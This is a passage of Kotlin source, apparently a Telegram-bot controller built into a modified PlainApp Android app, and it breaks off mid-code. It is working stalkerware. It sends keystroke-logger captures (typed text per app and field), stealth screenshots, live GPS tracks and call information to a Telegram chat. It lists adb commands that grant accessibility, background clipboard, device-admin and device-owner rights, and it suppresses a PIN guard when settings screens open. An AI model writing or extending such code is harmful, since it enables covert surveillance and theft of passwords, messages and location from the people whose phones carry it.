        val fileSize = document.optLong("file_size", 0L)
        val ctx      = com.ismartcoding.plain.MainApp.instance

        if (fileId.isBlank()) {
            sendMessage("❌ Could not read the file from Telegram. Please try sending it again.")
            return
        }

        sendMessage(
            "📥 <b>Backup received: ${htmlEsc(fileName)}</b>\n" +
            "📏 Size: ${humanSize(fileSize)}\n\n" +
            "⬇️ Downloading from Telegram…"
        )

        val filePath = withContext(Dispatchers.IO) {
            TelegramApiClient.getFilePath(token, fileId)
        }
        if (filePath.isNullOrBlank()) {
            sendMessage(
                "❌ Failed to get download URL from Telegram.\n\n" +
                "<i>Note: Telegram Bot API only supports files up to 20 MB.\n" +
                "For larger backups, use the Backup &amp; Restore page inside the app.</i>"
            )
            return
        }

        val destFile = java.io.File(ctx.cacheDir, "restore_incoming.plain")
        val dlOk = withContext(Dispatchers.IO) {
            TelegramApiClient.downloadToFile(token, filePath, destFile)
        }
        if (!dlOk || !destFile.exists()) {
            sendMessage("❌ Download failed. Check the network connection and try again.")
            return
        }

        sendMessage("📦 Unpacking and scanning backup contents…")

        val destDir = java.io.File(ctx.cacheDir, "restore_unzip")
        if (destDir.exists()) destDir.deleteRecursively()

        val unzipOk = withContext(Dispatchers.IO) {
            try {
                com.ismartcoding.lib.helpers.ZipHelper.unzip(destFile.inputStream(), destDir)
            } catch (e: Exception) {
                false
            }
        }
        if (!unzipOk) {
            sendMessage(
                "❌ Failed to unpack the backup file.\n\n" +
                "Make sure it is a valid <code>.plain</code> or <code>.zip</code> backup created by PlainApp."
            )
            destFile.delete()
            return
        }

        val stats = withContext(Dispatchers.IO) {
            BackupManager.scanStats(destDir)
        }

        sendMessage("🔄 Restoring all data to device…")

        withContext(Dispatchers.IO) {
            BackupManager.restoreFrom(destDir, ctx)
            destDir.deleteRecursively()
            destFile.delete()
        }

        val sb = StringBuilder()
        sb.append("✅ <b>Restore complete!</b>\n\n")
        sb.append("📊 <b>Restored data summary:</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("🗄 <b>Database files:</b> ${stats.databaseFiles}\n")
        if (stats.stealthShots > 0)     sb.append("📸 <b>Stealth screenshots:</b> ${stats.stealthShots}\n")
        if (stats.callRecordings > 0)   sb.append("📞 <b>Call recordings:</b> ${stats.callRecordings}\n")
        if (stats.intruderCaptures > 0) sb.append("👁 <b>Intruder captures:</b> ${stats.intruderCaptures}\n")
        if (stats.liveCaptures > 0)     sb.append("🎙 <b>Live captures:</b> ${stats.liveCaptures}\n")
        if (stats.geofenceAudio > 0)    sb.append("🌐 <b>Geofence audio clips:</b> ${stats.geofenceAudio}\n")
        if (stats.datastoreFiles > 0)   sb.append("⚙️ <b>Settings / DataStore:</b> ${stats.datastoreFiles} files\n")
        if (stats.sharedPrefsFiles > 0) sb.append("📋 <b>SharedPreferences:</b> ${stats.sharedPrefsFiles} files\n")
        if (stats.noteImages > 0)       sb.append("🖼 <b>Note images:</b> ${stats.noteImages}\n")
        if (stats.feedImages > 0)       sb.append("📰 <b>Feed images:</b> ${stats.feedImages}\n")
        if (stats.bookmarkFavicons > 0) sb.append("⭐ <b>Favicons:</b> ${stats.bookmarkFavicons}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📦 <b>Total files restored:</b> ${stats.totalFiles}\n\n")
        sb.append("🔄 <b>Restarting app in 3 seconds…</b>")
        sendMessage(sb.toString())

        kotlinx.coroutines.delay(3_000)
        com.ismartcoding.plain.helpers.AppHelper.relaunch(ctx)
    }

    private fun cmdDevice() {
        val ctx = MainApp.instance
        val name = PhoneHelper.getDeviceName(ctx)
        val batPct = PhoneHelper.getBatteryPercentage(ctx)
        val sb = StringBuilder("📲 <b>Device Information</b>\n\n")
        sb.append("📱 <b>Name:</b> ${htmlEsc(name)}\n")
        sb.append("🏭 <b>Brand:</b> ${htmlEsc(Build.BRAND)}\n")
        sb.append("🔧 <b>Model:</b> ${htmlEsc(Build.MODEL)}\n")
        sb.append("🤖 <b>Android:</b> ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n")
        sb.append("🆔 <b>Build:</b> ${htmlEsc(Build.DISPLAY.take(40))}\n")
        sb.append("🔋 <b>Battery:</b> $batPct%\n")
        sb.append("🕐 <b>Time:</b> ${ts}\n")
        val call = LiveCallTracker.snapshot()
        if (call.state != "idle") {
            sb.append("📞 <b>Call:</b> ${call.state} (${call.direction})\n")
        }
        sendMessage(sb.toString())
    }

    // ========== TRACKING HUB ==========

    private fun cmdTrackHub() {
        renderTrackHub(editMessageId = null)
    }

    private fun renderTrackHub(editMessageId: Long?) {
        val ctx = MainApp.instance
        val locOn = LocationTrackingHelper.isEnabled(ctx)
        val locCount = LocationTrackingHelper.countPoints(ctx)
        val locLatest = LocationTrackingHelper.latestPoint(ctx)
        val locInterval = LocationTrackingHelper.getIntervalSec(ctx)
        val keyOn = KeystrokeLogHelper.isEnabled(ctx)
        val keyCount = KeystrokeLogHelper.count(ctx = ctx)
        val keyLimit = KeystrokeLogHelper.getBufferLimit(ctx)
        val shotOn = StealthScreenshotHelper.isEnabled(ctx)
        val shotCount = StealthScreenshotHelper.count(ctx)
        val shotInterval = StealthScreenshotHelper.getIntervalMin(ctx)

        val sb = StringBuilder()
        sb.append("🛰 <b>Tracking Hub</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n\n")

        sb.append("🗺 <b>Live Location</b>  ${if (locOn) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("   📍 ${locCount} points · every ${locInterval}s\n")
        if (locLatest != null) {
            val age = (System.currentTimeMillis() - locLatest.ts) / 1000
            sb.append("   🕐 Last fix: ${age}s ago · ±${locLatest.accuracy.toInt()}m\n")
        }
        sb.append("   ➡️ /livelocation  /tracklocation\n\n")

        sb.append("⌨️ <b>Keystroke Logger</b>  ${if (keyOn) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("   📝 ${keyCount} entries · buffer ${keyLimit}\n")
        sb.append("   ➡️ /keystrokes  /keytop\n\n")

        sb.append("🖼 <b>Stealth Screenshots</b>  ${if (shotOn) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("   📸 ${shotCount} captures · every ${shotInterval} min\n")
        sb.append("   ➡️ /shots  /screenshot\n\n")

        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("🕐 ${ts}")

        val rows = listOf(
            listOf(
                (if (locOn) "⚪ Location OFF" else "🟢 Location ON") to (if (locOn) "trk_loc_off" else "trk_loc_on"),
                (if (keyOn) "⚪ Keys OFF" else "🟢 Keys ON") to (if (keyOn) "trk_key_off" else "trk_key_on"),
            ),
            listOf(
                (if (shotOn) "⚪ Shots OFF" else "🟢 Shots ON") to (if (shotOn) "trk_shot_off" else "trk_shot_on"),
                "🔄 Refresh" to "trk_refresh",
            ),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null)
            TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else
            sendMessage(sb.toString(), replyMarkup = markup)
    }

    private fun cmdLiveLocation(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 50) ?: 5
        val state = LocationTrackingHelper.isEnabled(ctx)
        val total = LocationTrackingHelper.countPoints(ctx)
        val interval = LocationTrackingHelper.getIntervalSec(ctx)
        val minDisp = LocationTrackingHelper.getMinDisplacement(ctx)
        val latest = LocationTrackingHelper.latestPoint(ctx)
        val recent = LocationTrackingHelper.listPoints(offset = 0, limit = n, ctx = ctx)

        val sb = StringBuilder()
        sb.append("🗺 <b>Live Location</b>  ${if (state) "🟢 STREAMING" else "⚪ STOPPED"}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📊 Total points: <b>${total}</b>\n")
        sb.append("⏱ Sample every: <b>${interval}s</b> · min move <b>${minDisp}m</b>\n\n")

        if (latest != null) {
            val age = (System.currentTimeMillis() - latest.ts) / 1000
            sb.append("📍 <b>Latest fix</b>\n")
            sb.append("   🌐 <code>${latest.lat}, ${latest.lng}</code>\n")
            sb.append("   🎯 ±${latest.accuracy.toInt()}m · ${latest.provider}\n")
            sb.append("   🚀 Speed: ${"%.1f".format(latest.speed * 3.6)} km/h\n")
            sb.append("   🔋 Battery: ${latest.batteryLevel}%${if (latest.charging) " ⚡" else ""}\n")
            sb.append("   🕐 ${age}s ago · ${fmtTime(latest.ts)}\n\n")
            try { TelegramApiClient.sendLocation(token, chatId, latest.lat, latest.lng) } catch (_: Throwable) {}
        } else {
            sb.append("(no location samples yet)\n\n")
        }

        if (recent.size > 1) {
            sb.append("🧭 <b>Recent ${recent.size} points</b>\n")
            recent.forEachIndexed { i, p ->
                val ago = (System.currentTimeMillis() - p.ts) / 1000
                sb.append("${i + 1}. <code>${"%.5f".format(p.lat)}, ${"%.5f".format(p.lng)}</code>  ±${p.accuracy.toInt()}m  · ${ago}s ago\n")
            }
            sb.append("\nUse /tracklocation N for more.")
        }
        sendMessage(sb.toString())
    }

    private fun cmdTrackLocation(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 100) ?: 20
        val pts = LocationTrackingHelper.listPoints(offset = 0, limit = n, ctx = ctx)
        if (pts.isEmpty()) { sendMessage("📍 No location points recorded yet.\n\nEnable Live Location from PlainApp → Tracking Hub."); return }
        val sb = StringBuilder("🧭 <b>Last ${pts.size} location points</b>\n━━━━━━━━━━━━━━━━━━━\n\n")
        pts.forEachIndexed { i, p ->
            sb.append("${i + 1}. <b>${fmtTime(p.ts)}</b>\n")
            sb.append("   🌐 <code>${"%.5f".format(p.lat)}, ${"%.5f".format(p.lng)}</code>\n")
            sb.append("   🎯 ±${p.accuracy.toInt()}m · 🚀 ${"%.1f".format(p.speed * 3.6)} km/h · 🔋 ${p.batteryLevel}%\n\n")
            if (sb.length > 3500) { sb.append("…"); return@forEachIndexed }
        }
        sendMessage(sb.toString())
    }

    private fun cmdKeystrokes(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 50) ?: 15
        val on = KeystrokeLogHelper.isEnabled(ctx)
        val total = KeystrokeLogHelper.count(ctx = ctx)
        val limit = KeystrokeLogHelper.getBufferLimit(ctx)
        val entries = KeystrokeLogHelper.list(offset = 0, limit = n, ctx = ctx)

        val sb = StringBuilder()
        sb.append("⌨️ <b>Keystroke Logger</b>  ${if (on) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📝 Total: <b>${total}</b> · buffer <b>${limit}</b>\n\n")
        if (entries.isEmpty()) {
            sb.append("(no entries captured yet)")
        } else {
            sb.append("📋 <b>Last ${entries.size} entries</b>\n\n")
            entries.forEachIndexed { i, e ->
                val app = if (e.appLabel.isNotBlank()) e.appLabel else e.packageName
                val field = if (e.fieldHint.isNotBlank()) " · <i>${htmlEsc(e.fieldHint)}</i>" else ""
                sb.append("${i + 1}. 📱 <b>${htmlEsc(app)}</b>$field\n")
                sb.append("   🕐 ${fmtTime(e.ts)}\n")
                sb.append("   <code>${htmlEsc(e.text.take(160))}</code>\n\n")
                if (sb.length > 3600) { sb.append("…"); return@forEachIndexed }
            }
        }
        sendMessage(sb.toString())
    }

    private fun cmdKeyTop() {
        val ctx = MainApp.instance
        val stats = KeystrokeLogHelper.packageBreakdown(ctx)
        if (stats.isEmpty()) { sendMessage("📊 No keystroke data yet."); return }
        val sb = StringBuilder("📊 <b>Top apps by keystrokes</b>\n━━━━━━━━━━━━━━━━━━━\n\n")
        val total = stats.sumOf { it.second }
        stats.take(15).forEachIndexed { i, (pkg, count) ->
            val pct = if (total > 0) (count * 100 / total) else 0
            val bar = "█".repeat((pct / 5).coerceAtMost(20)) + "░".repeat((20 - pct / 5).coerceAtLeast(0))
            sb.append("${i + 1}. <code>${htmlEsc(pkg)}</code>\n")
            sb.append("   $bar ${count} (${pct}%)\n\n")
        }
        sendMessage(sb.toString())
    }

    private suspend fun cmdShots(args: List<String>) {
        val ctx = MainApp.instance
        val n = args.firstOrNull()?.toIntOrNull()?.coerceIn(1, 30) ?: 10
        val on = StealthScreenshotHelper.isEnabled(ctx)
        val total = StealthScreenshotHelper.count(ctx)
        val list = StealthScreenshotHelper.list(0, n, ctx)

        val sb = StringBuilder()
        sb.append("🖼 <b>Stealth Screenshots</b>  ${if (on) "🟢 ON" else "⚪ OFF"}\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("📸 Total: <b>${total}</b>\n\n")
        if (list.isEmpty()) {
            sb.append("(no screenshots captured yet)\n\nUse /screenshot for an instant capture.")
            sendMessage(sb.toString())
            return
        }
        sb.append("📋 <b>Last ${list.size} captures</b>\n\n")
        list.forEachIndexed { i, s ->
            sb.append("${i + 1}. 🕐 <b>${fmtTime(s.ts)}</b>")
            if (s.manual) sb.append(" · 👆 manual")
            sb.append("\n   📐 ${s.width}×${s.height} · 💾 ${s.sizeBytes / 1024} KB\n")
            if (s.packageName.isNotBlank()) sb.append("   📱 <code>${htmlEsc(s.packageName)}</code>\n")
            sb.append("\n")
        }
        sendMessage(sb.toString())

        val latest = list.firstOrNull()
        if (latest != null) {
            val f = File(latest.absPath)
            if (f.exists()) {
                sendUploadPhoto()
                try { TelegramApiClient.sendPhoto(token, chatId, f, "🖼 Latest stealth shot · ${fmtTime(latest.ts)}") } catch (_: Throwable) {}
            }
        }
    }

    // ========== PERMISSIONS ==========

    private fun cmdPermissions() {
        val ctx = MainApp.instance
        val pkg = ctx.packageName
        val all = Permission.entries.filter { it != Permission.NONE }
        val granted = mutableListOf<Permission>()
        val denied = mutableListOf<Permission>()
        all.forEach {
            val ok = try { it.can(ctx) } catch (_: Throwable) { false }
            if (ok) granted.add(it) else denied.add(it)
        }
        val pct = if (all.isNotEmpty()) granted.size * 100 / all.size else 0
        val barFilled = (pct / 5).coerceIn(0, 20)
        val bar = "█".repeat(barFilled) + "░".repeat(20 - barFilled)

        fun group(p: Permission): String = when {
            p.name.contains("SMS") -> "📨 Messaging"
            p.name.contains("CONTACT") -> "👥 Contacts"
            p.name.contains("CALL") || p.name == "READ_PHONE_STATE" || p.name == "READ_PHONE_NUMBERS" -> "📞 Phone"
            p.name.contains("LOCATION") -> "📍 Location"
            p.name == "CAMERA" || p.name.startsWith("READ_MEDIA") || p.name == "WRITE_EXTERNAL_STORAGE" -> "🖼 Media & storage"
            p.name.contains("BLUETOOTH") -> "📡 Connectivity"
            p.name == "RECORD_AUDIO" -> "🎙 Audio"
            p.name == "POST_NOTIFICATIONS" || p.name == "NOTIFICATION_LISTENER" -> "🔔 Notifications"
            else -> "⚙️ System"
        }

        val sb = StringBuilder()
        sb.append("🛡 <b>App Permissions</b>\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n")
        sb.append("$bar  <b>${pct}%</b>\n")
        sb.append("✅ Granted: <b>${granted.size}</b>  ·  ❌ Denied: <b>${denied.size}</b>  ·  Total ${all.size}\n\n")

        val byGroup = all.groupBy { group(it) }
        byGroup.toSortedMap().forEach { (cat, perms) ->
            sb.append("<b>$cat</b>\n")
            perms.forEach { p ->
                val ok = try { p.can(ctx) } catch (_: Throwable) { false }
                val icon = if (ok) "✅" else "❌"
                sb.append("   $icon <code>${p.name}</code>\n")
            }
            sb.append("\n")
            if (sb.length > 3500) { sb.append("…"); return@forEach }
        }
        sb.append("🕐 ${ts}")
        sendMessage(sb.toString())

        // ── Protected / ADB permissions (separate message) ──
        data class AdbPerm(val name: String, val label: String, val granted: Boolean, val cmd: String)

        fun pmCheck(perm: String) = ctx.checkSelfPermission(perm) == android.content.pm.PackageManager.PERMISSION_GRANTED
        fun appOpsGranted(): Boolean = try {
            val ao = ctx.getSystemService(android.content.Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q)
                ao.unsafeCheckOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), pkg)
            else @Suppress("DEPRECATION") ao.checkOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), pkg)
            mode == android.app.AppOpsManager.MODE_ALLOWED
        } catch (_: Exception) { false }
        fun dndGranted(): Boolean = try {
            (ctx.getSystemService(android.content.Context.NOTIFICATION_SERVICE) as android.app.NotificationManager)
                .isNotificationPolicyAccessGranted
        } catch (_: Exception) { false }
        fun deviceAdminGranted(): Boolean = try {
            val dpm = ctx.getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
            val cn = android.content.ComponentName(ctx, com.ismartcoding.plain.receivers.PlainDeviceAdminReceiver::class.java)
            dpm.isAdminActive(cn)
        } catch (_: Exception) { false }
        fun notifListenerGranted(): Boolean = try {
            val cn = android.content.ComponentName(ctx, com.ismartcoding.plain.services.PNotificationListenerService::class.java)
            val enabled = android.provider.Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners") ?: ""
            enabled.contains(cn.flattenToString())
        } catch (_: Exception) { false }

        val adbPerms = listOf(
            AdbPerm("WRITE_SECURE_SETTINGS", "Modify Secure Settings (Airplane Mode)",
                pmCheck("android.permission.WRITE_SECURE_SETTINGS"),
                "adb shell pm grant $pkg android.permission.WRITE_SECURE_SETTINGS"),
            AdbPerm("TETHER_PRIVILEGED", "Hotspot / Tethering Control",
                pmCheck("android.permission.TETHER_PRIVILEGED"),
                "adb shell pm grant $pkg android.permission.TETHER_PRIVILEGED"),
            AdbPerm("READ_CLIPBOARD_IN_BACKGROUND", "Read Clipboard in Background",
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q)
                    pmCheck("android.permission.READ_CLIPBOARD_IN_BACKGROUND") else true,
                "adb shell pm grant $pkg android.permission.READ_CLIPBOARD_IN_BACKGROUND"),
            AdbPerm("PACKAGE_USAGE_STATS", "Usage Access (Screen Time)",
                appOpsGranted(),
                "adb shell appops set $pkg GET_USAGE_STATS allow"),
            AdbPerm("NOTIFICATION_POLICY_ACCESS", "Do Not Disturb Access",
                dndGranted(),
                "adb shell cmd notification allow_dnd $pkg"),
            AdbPerm("NOTIFICATION_LISTENER", "Notification Listener",
                notifListenerGranted(),
                "adb shell cmd notification allow_listener $pkg/.services.PNotificationListenerService"),
            AdbPerm("WRITE_SETTINGS", "Modify System Settings (Brightness/Volume)",
                android.provider.Settings.System.canWrite(ctx),
                "adb shell pm grant $pkg android.permission.WRITE_SETTINGS"),
            AdbPerm("SYSTEM_ALERT_WINDOW", "Display Over Other Apps",
                android.provider.Settings.canDrawOverlays(ctx),
                "adb shell appops set $pkg SYSTEM_ALERT_WINDOW allow"),
            AdbPerm("ACCESSIBILITY_SERVICE", "Accessibility Service (Keystrokes)",
                com.ismartcoding.plain.services.PlainAccessibilityService.isEnabled(ctx),
                "adb shell settings put secure enabled_accessibility_services $pkg/.services.PlainAccessibilityService"),
            AdbPerm("REQUEST_INSTALL_PACKAGES", "Install Unknown Apps (APK Self-Update)",
                try {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
                        ctx.packageManager.canRequestPackageInstalls()
                    else true
                } catch (_: Exception) { false },
                "adb shell appops set $pkg REQUEST_INSTALL_PACKAGES allow"),
            AdbPerm("DEVICE_ADMIN", "Device Administrator (Screen Lock)",
                deviceAdminGranted(),
                "adb shell dpm set-active-admin $pkg/.receivers.PlainDeviceAdminReceiver"),
            AdbPerm("DEVICE_OWNER", "Device Owner (Silent APK Install / Zero-Touch Update)",
                try {
                    val dpm = ctx.getSystemService(android.content.Context.DEVICE_POLICY_SERVICE) as? android.app.admin.DevicePolicyManager
                    dpm?.isDeviceOwnerApp(pkg) == true
                } catch (_: Exception) { false },
                "adb shell dpm set-device-owner $pkg/.receivers.PlainDeviceAdminReceiver"),
        )

        val adbGranted = adbPerms.count { it.granted }
        val adbMissing = adbPerms.filter { !it.granted }

        val sb2 = StringBuilder()
        sb2.append("🔐 <b>Protected Permissions (ADB)</b>\n")
        sb2.append("━━━━━━━━━━━━━━━━━━━\n")
        sb2.append("✅ Granted: <b>$adbGranted</b>  ·  ❌ Missing: <b>${adbMissing.size}</b>  ·  Total ${adbPerms.size}\n\n")

        adbPerms.forEach { p ->
            val icon = if (p.granted) "✅" else "❌"
            sb2.append("$icon <b>${p.label}</b>\n")
            sb2.append("   <code>${p.name}</code>\n")
            if (!p.granted) sb2.append("   📋 <code>${p.cmd}</code>\n")
            sb2.append("\n")
        }

        if (adbMissing.isNotEmpty()) {
            sb2.append("━━━━━━━━━━━━━━━━━━━\n")
            sb2.append("📋 <b>Grant all missing — run in terminal:</b>\n\n")
            adbMissing.forEach { p ->
                sb2.append("<code>${p.cmd}</code>\n")
            }
            sb2.append("\n⚠️ Requires USB Debugging enabled.\n")
            sb2.append("Permissions persist until app is uninstalled.\n")
        } else {
            sb2.append("🎉 All protected permissions are granted!\n")
        }
        sb2.append("\n🕐 ${ts}")
        sendMessage(sb2.toString())
    }

    // ========== OPEN PERMS ==========

    private fun cmdOpenPerms(arg: String) {
        val ctx = MainApp.instance
        val pkg = ctx.packageName

        data class PermEntry(
            val key: String,
            val label: String,
            val granted: Boolean,
            val hasUi: Boolean,
        )

        fun pmCheck(p: String) = ctx.checkSelfPermission(p) == android.content.pm.PackageManager.PERMISSION_GRANTED

        val runtimePerms = listOf(
            PermEntry("CAMERA", "Camera", pmCheck("android.permission.CAMERA"), true),
            PermEntry("RECORD_AUDIO", "Microphone", pmCheck("android.permission.RECORD_AUDIO"), true),
            PermEntry("WRITE_EXTERNAL_STORAGE", "Storage / Files",
                try { com.ismartcoding.plain.helpers.FileHelper.hasStoragePermission(ctx) } catch (_: Exception) { false }, true),
            PermEntry("READ_SMS", "Read SMS", pmCheck("android.permission.READ_SMS"), true),
            PermEntry("SEND_SMS", "Send SMS", pmCheck("android.permission.SEND_SMS"), true),
            PermEntry("READ_CONTACTS", "Contacts", pmCheck("android.permission.READ_CONTACTS"), true),
            PermEntry("READ_CALL_LOG", "Call Log", pmCheck("android.permission.READ_CALL_LOG"), true),
            PermEntry("CALL_PHONE", "Make Calls", pmCheck("android.permission.CALL_PHONE"), true),
            PermEntry("READ_PHONE_NUMBERS", "Phone Numbers", pmCheck("android.permission.READ_PHONE_NUMBERS"), true),
            PermEntry("POST_NOTIFICATIONS", "Notifications",
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU)
                    pmCheck("android.permission.POST_NOTIFICATIONS")
                else android.app.NotificationManager::class.java.let { true }, true),
            PermEntry("ACCESS_FINE_LOCATION", "Precise Location", pmCheck("android.permission.ACCESS_FINE_LOCATION"), true),
            PermEntry("ACCESS_BACKGROUND_LOCATION", "Background Location", pmCheck("android.permission.ACCESS_BACKGROUND_LOCATION"), true),
            PermEntry("BLUETOOTH_CONNECT", "Bluetooth",
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S)
                    pmCheck("android.permission.BLUETOOTH_CONNECT") else true, true),
            PermEntry("SYSTEM_ALERT_WINDOW", "Draw Over Other Apps", android.provider.Settings.canDrawOverlays(ctx), true),
            PermEntry("WRITE_SETTINGS", "Modify System Settings", android.provider.Settings.System.canWrite(ctx), true),
            PermEntry("NOTIFICATION_LISTENER", "Notification Listener",
                android.provider.Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners")
                    ?.contains(android.content.ComponentName(ctx, com.ismartcoding.plain.services.PNotificationListenerService::class.java).flattenToString()) == true, true),
            PermEntry("ACCESSIBILITY_SERVICE", "Accessibility Service",
                com.ismartcoding.plain.services.PlainAccessibilityService.isEnabled(ctx), true),
            PermEntry("PACKAGE_USAGE_STATS", "Usage Access",
                try {
                    val ao = ctx.getSystemService(android.content.Context.APP_OPS_SERVICE) as android.app.AppOpsManager
                    (if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q)
                        ao.unsafeCheckOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), pkg)
                    else @Suppress("DEPRECATION") ao.checkOpNoThrow("android:get_usage_stats", android.os.Process.myUid(), pkg)
                    ) == android.app.AppOpsManager.MODE_ALLOWED
                } catch (_: Exception) { false }, true),
            PermEntry("REQUEST_INSTALL_PACKAGES", "Install Unknown Apps",
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
                    ctx.packageManager.canRequestPackageInstalls() else true, true),
        )

        // Direct open by name
        if (arg.isNotEmpty()) {
            val name = arg.uppercase().trim()
            val match = runtimePerms.firstOrNull { it.key == name }
            if (match == null) {
                sendMessage("❓ Unknown permission: <code>$name</code>\n\nAvailable keys:\n${runtimePerms.joinToString("\n") { "• <code>${it.key}</code>" }}")
                return
            }
            val opened = openPermSettingsScreen(name, ctx)
            sendMessage(if (opened) "📲 Opened <b>${match.label}</b> settings screen on device." else "❌ No direct settings screen for <code>$name</code> — grant it via ADB.")
            return
        }

        // Show interactive menu
        val sb = StringBuilder()
        sb.append("📲 <b>Open Permission Settings</b>\n")
        sb.append("Tap a button to open that permission's settings screen directly on the device.\n")
        sb.append("━━━━━━━━━━━━━━━━━━━\n\n")
        val granted = runtimePerms.count { it.granted }
        sb.append("✅ Granted: <b>$granted</b>  ·  ❌ Missing: <b>${runtimePerms.size - granted}</b>\n\n")
        runtimePerms.forEach { p ->
            sb.append("${if (p.granted) "✅" else "❌"} ${p.label}\n")
        }
        sb.append("\n🕐 ${ts}")

        // Build inline keyboard — 2 buttons per row, show icon based on grant status
        val rows = runtimePerms.chunked(2).map { chunk ->
            chunk.map { p ->
                val icon = if (p.granted) "✅" else "📲"
                "$icon ${p.label}" to "openp:${p.key}"
            }
        }
        sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
    }

    /** Opens the system settings screen for the given permission key directly on the device.
     *  Returns true if a settings screen was opened, false if the permission can only be granted via ADB. */
    private fun openPermSettingsScreen(key: String, ctx: android.content.Context): Boolean {
        val pkg = ctx.packageName
        fun appInfo(): android.content.Intent =
            android.content.Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                android.net.Uri.parse("package:$pkg"))
                .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)

        val intent: android.content.Intent? = when (key) {
            "SYSTEM_ALERT_WINDOW" ->
                android.content.Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    android.net.Uri.parse("package:$pkg"))
                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            "WRITE_SETTINGS" ->
                android.content.Intent(android.provider.Settings.ACTION_MANAGE_WRITE_SETTINGS,
                    android.net.Uri.parse("package:$pkg"))
                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            "NOTIFICATION_LISTENER" ->
                android.content.Intent(android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            "ACCESSIBILITY_SERVICE" ->
                android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            "PACKAGE_USAGE_STATS" ->
                android.content.Intent(android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS)
                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            "REQUEST_INSTALL_PACKAGES" ->
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
                    android.content.Intent(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                        android.net.Uri.parse("package:$pkg"))
                        .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                else null
            "WRITE_EXTERNAL_STORAGE" ->
                if (com.ismartcoding.lib.isRPlus())
                    android.content.Intent(android.provider.Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                        android.net.Uri.parse("package:$pkg"))
                        .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                else appInfo()
            "POST_NOTIFICATIONS" ->
                android.content.Intent(android.provider.Settings.ACTION_APP_NOTIFICATION_SETTINGS)
                    .putExtra(android.provider.Settings.EXTRA_APP_PACKAGE, pkg)
                    .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            "CAMERA", "RECORD_AUDIO", "READ_SMS", "SEND_SMS",
            "READ_CONTACTS", "READ_CALL_LOG", "CALL_PHONE", "READ_PHONE_NUMBERS",
            "ACCESS_FINE_LOCATION", "ACCESS_BACKGROUND_LOCATION",
            "BLUETOOTH_CONNECT" -> appInfo()
            else -> null
        }
        return if (intent != null) {
            // Pre-authorize the AppInfoGuard 30-second window so the accessibility
            // service does NOT show the PIN prompt when the settings screen appears.
            // Only /openperms triggers this — no other command calls markVerified().
            com.ismartcoding.plain.helpers.AppInfoGuard.markVerified()
            try { ctx.startActivity(intent); true } catch (_: Exception) {
                try { ctx.startActivity(appInfo()); true } catch (_: Exception) { false }
            }
        } else false
    }

    // ========== REQUEST PERMISSION (dialog on device) ==========

    private fun cmdReqPerm(arg: String = "") {
        data class Perm(val key: String, val label: String, val granted: Boolean)

        val ctx = MainApp.instance
        val pkg = ctx.packageName
        fun pmCheck(p: String) = ctx.checkSelfPermission(p) == android.content.pm.PackageManager.PERMISSION_GRANTED

        val allPerms = listOf(
            // Camera & Mic
            Perm("CAMERA",               "📷 Camera",               pmCheck("android.permission.CAMERA")),
            Perm("RECORD_AUDIO",         "🎙 Microphone",            pmCheck("android.permission.RECORD_AUDIO")),
            // Storage / Media
            Perm("WRITE_EXTERNAL_STORAGE","📁 Storage / Files",
